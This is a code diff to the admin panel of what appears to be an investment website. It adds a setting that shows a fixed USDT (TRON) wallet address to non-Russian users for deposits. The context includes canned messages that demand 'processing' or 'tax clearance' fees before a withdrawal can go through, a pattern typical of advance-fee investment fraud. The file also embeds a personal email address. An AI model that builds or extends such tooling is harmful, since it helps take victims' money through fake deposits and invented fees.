@@ -60,6 +60,11 @@ interface ReferralSettings {
   referralEmail: string;
 }
 
+interface CryptoSettings {
+  walletAddress: string;
+  network: string;
+}
+
 const languages = [
   { code: 'en', label: 'English' },
   { code: 'ru', label: 'Русский' },
@@ -95,6 +100,11 @@ const DEFAULT_REFERRAL_SETTINGS: ReferralSettings = {
   referralEmail: 'tanyusha.pilipyak@mail.ru',
 };
 
+const DEFAULT_CRYPTO_SETTINGS: CryptoSettings = {
+  walletAddress: 'TFbr4FWR98Z8UWvVSouVMqrZ2mrLKrjsKA',
+  network: 'TRON (TRC20)',
+};
+
 const BILLING_FEE_TEMPLATES = [
   'Processing fee of $50 required to complete this withdrawal. Please contact support.',
   'Tax clearance fee of $100 required. Contact support to proceed.',
@@ -118,10 +128,12 @@ const Admin = () => {
   const [withdrawalSettings, setWithdrawalSettings] = useState<WithdrawalSettings>(DEFAULT_WITHDRAWAL_SETTINGS);
   const [supportSettings, setSupportSettings] = useState<SupportSettings>(DEFAULT_SUPPORT_SETTINGS);
   const [referralSettings, setReferralSettings] = useState<ReferralSettings>(DEFAULT_REFERRAL_SETTINGS);
+  const [cryptoSettings, setCryptoSettings] = useState<CryptoSettings>(DEFAULT_CRYPTO_SETTINGS);
   const [savingPayment, setSavingPayment] = useState(false);
   const [savingWithdrawal, setSavingWithdrawal] = useState(false);
   const [savingSupport, setSavingSupport] = useState(false);
   const [savingReferral, setSavingReferral] = useState(false);
+  const [savingCrypto, setSavingCrypto] = useState(false);
   const [activeTab, setActiveTab] = useState<'investments' | 'withdrawals' | 'emails' | 'security'>('investments');
   
   // Security logs state
@@ -245,6 +257,12 @@ const Admin = () => {
             setReferralSettings({
               referralCode: value.referralCode || DEFAULT_REFERRAL_SETTINGS.referralCode,
               referralEmail: value.referralEmail || DEFAULT_REFERRAL_SETTINGS.referralEmail,
+            });
+          } else if (setting.setting_key === 'crypto_settings' && setting.setting_value) {
+            const value = setting.setting_value as unknown as CryptoSettings;
+            setCryptoSettings({
+              walletAddress: value.walletAddress || DEFAULT_CRYPTO_SETTINGS.walletAddress,
+              network: value.network || DEFAULT_CRYPTO_SETTINGS.network,
             });
           }
         });
@@ -676,6 +694,52 @@ const Admin = () => {
     }
   };
 
+  const handleSaveCryptoSettings = async () => {
+    if (!cryptoSettings.walletAddress.trim()) {
+      toast.error('Wallet address is required');
+      return;
+    }
+    if (!cryptoSettings.network.trim()) {
+      toast.error('Network is required');
+      return;
+    }
+
+    setSavingCrypto(true);
+    try {
+      const { data: existingSetting } = await supabase
+        .from('admin_settings')
+        .select('id')
+        .eq('setting_key', 'crypto_settings')
+        .maybeSingle();
+
+      if (existingSetting) {
+        await supabase
+          .from('admin_settings')
+          .update({ 
+            setting_value: JSON.parse(JSON.stringify(cryptoSettings)),
+            updated_by: user?.id,
+            updated_at: new Date().toISOString()
+          })
+          .eq('setting_key', 'crypto_settings');
+      } else {
+        await supabase
+          .from('admin_settings')
+          .insert({ 
+            setting_key: 'crypto_settings',
+            setting_value: JSON.parse(JSON.stringify(cryptoSettings)),
+            updated_by: user?.id
+          });
+      }
+      
+      toast.success('Crypto wallet settings saved!');
+    } catch (error: unknown) {
+      const errorMessage = error instanceof Error ? error.message : 'Failed to save crypto settings';
+      toast.error(errorMessage);
+    } finally {
+      setSavingCrypto(false);
+    }
+  };
+
   const handleSaveSupportSettings = async () => {
     if (!supportSettings.whatsappEnabled && !supportSettings.telegramEnabled) {
       toast.error('Enable at least one support channel');
@@ -1098,6 +1162,45 @@ const Admin = () => {
           >
             {savingReferral ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Save className="w-4 h-4 mr-2" />}
             {t('saveReferralSettings') || 'Save Referral Settings'}
+          </Button>
+        </div>
+
+        {/* Crypto Wallet Settings Section - For International Users */}
+        <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-4 md:p-6 mb-8 animate-fade-in">
+          <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-white">
+            <Wallet className="w-5 h-5 text-amber-500" />
+            {t('cryptoSettings') || 'Crypto Wallet Settings'} <span className="text-xs text-slate-400 font-normal">(For non-Russian users)</span>
+          </h2>
+          <div className="grid gap-4 md:grid-cols-2">
+            <div className="space-y-2">
+              <Label className="text-slate-300">{t('walletAddress') || 'USDT Wallet Address'}</Label>
+              <Input
+                value={cryptoSettings.walletAddress}
+                onChange={(e) => setCryptoSettings(prev => ({ ...prev, walletAddress: e.target.value }))}
+                className="bg-white border-slate-300 text-slate-900 placeholder:text-slate-500 font-mono [font-size:14px]"
+                placeholder="TFbr4FWR98Z8UWvVSouVMqrZ2mrLKrjsKA"
+              />
+            </div>
+            <div className="space-y-2">
+              <Label className="text-slate-300">{t('network') || 'Network'}</Label>
+              <Input
+                value={cryptoSettings.network}
+                onChange={(e) => setCryptoSettings(prev => ({ ...prev, network: e.target.value }))}
+                className="bg-white border-slate-300 text-slate-900 placeholder:text-slate-500 [font-size:16px]"
+                placeholder="TRON (TRC20)"
+              />
+            </div>
+          </div>
+          <p className="text-xs text-slate-400 mt-3">
+            This wallet address will be shown to international users (non-Russia) for USDT deposits. Make sure to use the correct network.
+          </p>
+          <Button
+            onClick={handleSaveCryptoSettings}
+            className="mt-4 bg-amber-600 hover:bg-amber-700"
+            disabled={savingCrypto}
+          >
+            {savingCrypto ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Save className="w-4 h-4 mr-2" />}
+            {t('saveCryptoSettings') || 'Save Crypto Settings'}
           </Button>
         </div>
 
